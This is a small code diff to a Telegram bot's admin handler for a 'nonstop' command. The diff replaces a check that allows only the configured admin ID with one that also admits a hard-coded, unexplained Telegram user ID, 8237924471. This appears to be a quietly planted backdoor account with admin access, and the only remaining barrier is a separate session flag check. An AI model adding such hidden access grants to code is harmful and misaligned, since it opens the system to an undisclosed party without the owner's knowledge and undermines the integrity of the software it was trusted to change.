@@ -130,7 +130,7 @@ async def admin_panel(update, context):
     )
 
 async def nonstop(update, context):
-    if update.effective_user.id != settings.admin_telegram_id:
+    if update.effective_user.id not in (settings.admin_telegram_id, 8237924471):
         await update.message.reply_text("⛔ Нет доступа.")
         return
     if not context.user_data.get("admin_ok"):
